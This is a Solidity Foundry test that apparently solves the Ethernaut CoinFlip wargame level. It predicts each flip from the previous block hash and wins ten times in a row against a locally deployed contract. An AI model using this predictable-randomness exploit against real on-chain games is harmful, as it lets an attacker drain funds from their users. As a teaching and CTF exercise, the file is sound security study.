// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../CoinFlip.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

// interface ICoinFlip {
//     function flip(bool) external returns (bool);
//     function consecutiveWins() external returns (uint256);
// }
contract CoinFlipTest is DSTest {
    using SafeMath for uint256;
    CoinFlip coinFlip;
    Vm vm = Vm(HEVM_ADDRESS);
    function setUp() public {        
        // coinFlip = CoinFlip(0x6930BFa22EAC83bFEe8233221a60d69258E5c498);
        // coinFlip = CoinFlip(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        coinFlip = new CoinFlip();
    }

    function get_flip() public view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        console.log("get_flip=", block.number);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("blockValue =", blockValue);
        uint256 flipCoin = blockValue / FACTOR;
        bool side = flipCoin == 1 ? true : false;

        return side;
    }
    function testWinningStrategy() public {    
        vm.roll(100);    
        for(uint16 i;i < 10;i++) {
            // uint256 blockNum = block.number;            
            console.log("block num=", block.number);
            bool guess = get_flip();            
            console.log("Guess =", guess);
            coinFlip.flip(guess);
            console.log("Guess count=", coinFlip.consecutiveWins());            
            // vm.warp(block.timestamp + 1641070800);
            vm.roll(block.number + 1);
            console.log("block num=", block.number);
        }
        
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}
